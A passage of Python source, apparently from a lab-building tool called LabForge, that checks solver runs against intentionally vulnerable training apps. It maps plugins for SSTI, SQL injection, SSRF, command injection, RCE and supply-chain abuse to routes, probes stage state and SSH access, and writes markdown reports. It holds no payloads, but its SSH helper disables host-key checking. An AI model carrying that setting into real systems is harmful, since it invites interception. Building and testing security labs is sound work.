        plugin=plugin,
        status="warning",
        target=base_url,
        evidence=evidence,
        message=f"{discovery_note}; plugin HTTP solver sequence is not implemented",
    )


def plugin_step(order: int, step_id: str, service: str, plugin: str, target: str, evidence: list[str], ok: bool, message: str) -> SolverRunStep:
    expected_stage_evidence = expected_emitted_evidence(evidence)
    if ok:
        state_ok, state_note = stage_state_check(target, expected_stage_evidence)
        if state_note:
            message = f"{message}; {state_note}"
        ok = ok and state_ok
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="vulnerability-behavior",
        service=service,
        plugin=plugin,
        status="passed" if ok else "failed",
        target=target,
        evidence=evidence,
        message=message,
    )


def expected_emitted_evidence(evidence: list[str]) -> list[str]:
    expected: list[str] = []
    for item in evidence:
        text = str(item).strip()
        if not text.startswith("emitted_evidence="):
            continue
        values = text.split("=", maxsplit=1)[1]
        for value in values.split(","):
            value = value.strip()
            if value and value not in expected:
                expected.append(value)
    return expected


def stage_state_check(base_url: str, expected_evidence: list[str]) -> tuple[bool, str]:
    if not base_url.startswith("http"):
        return True, ""
    status, data, _ = http_json("GET", f"{base_url}/api/state", None, 3)
    if status == 404:
        if expected_evidence:
            return False, f"stage_state=not-exposed; missing_expected_evidence={','.join(expected_evidence)}"
        return True, "stage_state=not-exposed"
    if status == 0:
        if expected_evidence:
            return False, f"stage_state=unreachable; missing_expected_evidence={','.join(expected_evidence)}"
        return True, "stage_state=unreachable"
    if status != 200:
        if expected_evidence:
            return False, f"stage_state={status}; missing_expected_evidence={','.join(expected_evidence)}"
        return True, f"stage_state={status}"
    acquired = data.get("acquired_evidence", []) if isinstance(data, dict) else []
    stages = data.get("stages", []) if isinstance(data, dict) else []
    unlocked = [
        stage
        for stage in stages
        if isinstance(stage, dict) and str(stage.get("status", "")).lower() == "unlocked"
    ]
    if not isinstance(acquired, list) or not isinstance(stages, list):
        if expected_evidence:
            return False, f"stage_state=200; shape=unexpected; missing_expected_evidence={','.join(expected_evidence)}"
        return True, "stage_state=200; shape=unexpected"
    acquired_text = {str(item) for item in acquired}
    missing = [item for item in expected_evidence if item not in acquired_text]
    note = f"stage_state=200; acquired_evidence={len(acquired)}; unlocked_stages={len(unlocked)}"
    if expected_evidence:
        note = f"{note}; expected_evidence={','.join(expected_evidence)}"
    if missing:
        return False, f"{note}; missing_expected_evidence={','.join(missing)}"
    return True, note


def plugin_landing_probe(base_url: str, plugin: str, timeout_seconds: int) -> tuple[bool, str]:
    specs: dict[str, tuple[list[str], list[str]]] = {
        "ssti-preview": (["/operations/preview", "/labforge/scaffold/ssti-preview"], ["Response Preview"]),
        "stored-xss-review": (["/operations/review", "/labforge/scaffold/review"], ["Review Intake"]),
        "idor-object-access": (["/objects", "/api/business-objects", "/labforge/scaffold/objects"], ["Business Object Catalog"]),
        "jwt-role-confusion": (["/operations/identity", "/api/identity/session", "/labforge/scaffold/identity/session"], ["Identity Operations Console"]),
        "sql-injection-reporting": (["/operations/reports", "/api/reports", "/labforge/scaffold/reports"], ["Reporting Workbench"]),
        "ssrf-internal-fetch": (["/operations/fetch", "/labforge/scaffold/fetch"], ["Upstream Import Console"]),
        "path-traversal-download": (["/documents", "/labforge/scaffold/documents"], ["Document Library"]),
        "unsafe-file-upload": (["/attachments", "/labforge/scaffold/uploads"], ["Case Attachment Portal"]),
        "diagnostic-command-injection": (["/operations/diagnostics", "/labforge/scaffold/diagnostics"], ["Operations Diagnostics Console"]),
        "solr-velocity-rce": (["/operations/search-admin", "/solr/ops-core/admin/info/system", "/labforge/scaffold/solr/admin/info/system"], ["Search Operations Console"]),
        "credential-exposure": (["/operations/config", "/api/config", "/labforge/scaffold/config"], ["Runtime Configuration"]),
        "build-pipeline-abuse": (["/operations/build", "/api/build/context", "/labforge/scaffold/build/context"], ["Release Build Console"]),
        "signed-update-publish": (["/operations/update-channel", "/api/channels/smoke", "/labforge/scaffold/channels/smoke"], ["Update Channel Console"]),
        "customer-update-callback": (["/operations/customer-agent", "/api/customer/status", "/labforge/scaffold/customer/status"], ["Customer Agent Status"]),
    }
    routes, expected_texts = specs.get(plugin, ([], []))
    if not routes:
        return True, "landing=not-required"
    status, body, route = http_text_first("GET", base_url, routes, timeout_seconds)
    if status == 0:
        return False, "landing=unreachable"
    if status == 404:
        return False, f"landing=missing; landing_route={route}"
    missing = [text for text in expected_texts if text not in body]
    if missing:
        return False, f"landing={status}; landing_route={route}; missing_landing_text={','.join(missing)}"
    return 200 <= status < 400, f"landing={status}; landing_route={route}; landing_texts={len(expected_texts)}"


def stage_state_message(base_url: str) -> str:
    return stage_state_check(base_url, [])[1]


def discovery_message(status: int, data: dict) -> str:
    items = data.get("items", []) if isinstance(data, dict) else []
    count = len(items) if isinstance(items, list) else 0
    if status == 200:
        return f"discovery=200; discovery_items={count}"
    if status == 0:
        return "discovery=unreachable"
    return f"discovery={status}"


def runbook_message(status: int, body: str, route: str) -> str:
    if status == 200 and "Operations Runbook" in body:
        return f"runbook=200; runbook_route={route}"
    if status == 404:
        return f"runbook=missing; runbook_route={route}"
    if status == 0:
        return "runbook=unreachable"
    return f"runbook={status}; runbook_route={route}"


def route_catalog_message(status: int, data: dict) -> str:
    routes = data.get("routes", []) if isinstance(data, dict) else []
    count = len(routes) if isinstance(routes, list) else 0
    if status == 200:
        return f"route_catalog=200; route_count={count}"
    if status == 404:
        return "route_catalog=missing"
    if status == 0:
        return "route_catalog=unreachable"
    return f"route_catalog={status}; route_count={count}"


def operations_context_message(status: int, data: dict) -> str:
    records = data.get("records", []) if isinstance(data, dict) else []
    count = len(records) if isinstance(records, list) else 0
    if status == 200:
        return f"operations_context=200; context_records={count}"
    if status == 404:
        return "operations_context=missing"
    if status == 0:
        return "operations_context=unreachable"
    return f"operations_context={status}; context_records={count}"


def http_json(method: str, url: str, payload: dict | None, timeout_seconds: int) -> tuple[int, dict, str]:
    data = None
    headers = {"User-Agent": "LabForge-SolverRunner/1.0"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    request = Request(url, data=data, headers=headers, method=method)
    last_error = ""
    for attempt in range(3):
        try:
            with urlopen(request, timeout=timeout_seconds) as response:
                body = response.read(8192).decode("utf-8", "replace")
                return int(response.status), parse_json_body(body), body
        except HTTPError as exc:
            try:
                body = exc.read().decode("utf-8", "replace")
            finally:
                exc.close()
            return int(exc.code), parse_json_body(body), body
        except (URLError, OSError) as exc:
            last_error = str(exc)
            if attempt < 2:
                time.sleep(0.1 * (attempt + 1))
    return 0, {}, last_error


def http_json_first(method: str, base_url: str, routes: list[str], payload: dict | None, timeout_seconds: int) -> tuple[int, dict, str, str]:
    last_status = 0
    last_data: dict = {}
    last_body = ""
    last_route = ""
    for route in routes:
        status, data, body = http_json(method, f"{base_url}{route}", payload, timeout_seconds)
        if status != 404 and status != 0:
            return status, data, body, route
        last_status, last_data, last_body, last_route = status, data, body, route
    return last_status, last_data, last_body, last_route


def http_text_first(method: str, base_url: str, routes: list[str], timeout_seconds: int) -> tuple[int, str, str]:
    last_status = 0
    last_body = ""
    last_route = ""
    for route in routes:
        status, body = http_text(method, f"{base_url}{route}", timeout_seconds)
        if status != 404 and status != 0:
            return status, body, route
        last_status, last_body, last_route = status, body, route
    return last_status, last_body, last_route


def http_text(method: str, url: str, timeout_seconds: int) -> tuple[int, str]:
    request = Request(url, headers={"User-Agent": "LabForge-SolverRunner/1.0"}, method=method)
    last_error = ""
    for attempt in range(3):
        try:
            with urlopen(request, timeout=timeout_seconds) as response:
                return int(response.status), response.read(8192).decode("utf-8", "replace")
        except HTTPError as exc:
            try:
                body = exc.read().decode("utf-8", "replace")
            finally:
                exc.close()
            return int(exc.code), body
        except (URLError, OSError) as exc:
            last_error = str(exc)
            if attempt < 2:
                time.sleep(0.1 * (attempt + 1))
    return 0, last_error


def http_multipart_upload(url: str, *, field_name: str, filename: str, content: bytes, timeout_seconds: int) -> tuple[int, dict, str]:
    boundary = "----LabForgeSolverBoundary"
    body = b"".join(
        [
            f"--{boundary}\r\n".encode("ascii"),
            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode("utf-8"),
            b"Content-Type: text/plain\r\n\r\n",
            content,
            b"\r\n",
            f"--{boundary}--\r\n".encode("ascii"),
        ]
    )
    request = Request(
        url,
        data=body,
        headers={
            "User-Agent": "LabForge-SolverRunner/1.0",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
        method="POST",
    )
    try:
        with urlopen(request, timeout=timeout_seconds) as response:
            text = response.read(8192).decode("utf-8", "replace")
            return int(response.status), parse_json_body(text), text
    except HTTPError as exc:
        try:
            text = exc.read().decode("utf-8", "replace")
        finally:
            exc.close()
        return int(exc.code), parse_json_body(text), text
    except URLError as exc:
        return 0, {}, str(exc)
    except OSError as exc:
        return 0, {}, str(exc)


def parse_json_body(body: str) -> dict:
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def run_ssh_probe(order: int, step_id: str, command: str, evidence: list[str], *, timeout_seconds: int) -> SolverRunStep:
    argv = ssh_batch_argv(command)
    if not argv:
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="skipped", command=command, evidence=evidence, message="unsupported SSH command")
    if not shutil.which(argv[0]):
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="skipped", command=command, evidence=evidence, message="ssh executable missing")
    try:
        completed = subprocess.run(argv, check=False, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        return SolverRunStep(order=order, step_id=step_id, action_type="access", status="failed", command=command, evidence=evidence, message=f"ssh timed out after {timeout_seconds}s")
    return SolverRunStep(
        order=order,
        step_id=step_id,
        action_type="access",
        status="passed" if completed.returncode == 0 else "failed",
        command=command,
        evidence=evidence,
        stdout=completed.stdout.strip(),
        stderr=completed.stderr.strip(),
        message=f"exit_code={completed.returncode}",
    )


def ssh_batch_argv(command: str) -> list[str]:
    if not command.startswith("ssh "):
        return []
    parts = command.split()
    if "-o" not in parts:
        parts[1:1] = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
    if "true" not in parts:
        parts.append("true")
    return parts


def ssh_command_sequence_argv(connect: str, remote_script: str) -> list[str]:
    if not connect.startswith("ssh "):
        return []
    parts = connect.split()
    if "-o" not in parts:
        parts[1:1] = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
    return [*parts, remote_script]


def planned_target(action_type: str, browser_targets: list[str], terminal_targets: list[str], final_targets: list[str] | None = None) -> str:
    if action_type == "final-submission" and final_targets:
        return final_targets[0]
    if action_type == "access" and browser_targets:
        return browser_targets[0]
    if action_type == "access" and terminal_targets:
        return terminal_targets[0]
    if action_type == "command-sequence" and terminal_targets:
        return terminal_targets[0]
    return ""


def aggregate_solver_status(steps: list[SolverRunStep], *, execute: bool) -> Literal["planned", "passed", "warning", "failed"]:
    if not execute:
        return "planned"
    if any(step.status == "failed" for step in steps):
        return "failed"
    if any(step.status in {"warning", "skipped", "planned"} for step in steps):
        return "warning"
    return "passed"


def solver_next_actions(plan: dict, browser_targets: list[str], terminal_targets: list[str], final_targets: list[str], *, execute: bool) -> list[str]:
    actions = []
    if browser_targets:
        actions.append(f"Open learner browser target: {browser_targets[0]}")
    if terminal_targets:
        actions.append(f"Open attacker terminal target: {terminal_targets[0]}")
    if final_targets:
        actions.append(f"Use final submission endpoint when proof is collected: {final_targets[0]}")
    if not execute:
        actions.append("Re-run with --execute after provider startup to probe browser and SSH access.")
    return actions


def render_solver_run_markdown(report: SolverRunReport) -> str:
    lines = [
        f"# Solver Run - {report.title or report.lab_id}",
        "",
        f"- Lab ID: `{report.lab_id}`",
        f"- Mode: `{report.mode}`",
        f"- Status: `{report.status}`",
        f"- Solver plan: `{report.solver_plan}`",
        f"- Access manifest: `{report.access_manifest or '-'}`",
        f"- Endpoint manifest: `{report.endpoint_manifest or '-'}`",
        "",
        "## Steps",
        "",
        "| # | Step | Type | Status | Service | Plugin | Target/Command | Message |",
        "|---|---|---|---|---|---|---|---|",
    ]
    for step in report.steps:
        target = step.target or step.command or "-"
        lines.append(
            f"| {step.order} | `{escape_cell(step.step_id)}` | `{escape_cell(step.action_type)}` | {step.status} | "
            f"`{escape_cell(step.service or '-')}` | `{escape_cell(step.plugin or '-')}` | `{escape_cell(target)}` | {escape_cell(step.message or '-')} |"
        )
    lines.extend(["", "## Next Actions", ""])
    lines.extend(f"- {item}" for item in report.next_actions)
    lines.append("")
    return "\n".join(lines)


def escape_cell(value: str) -> str:
    return str(value).replace("|", "\\|").replace("\n", "<br>")
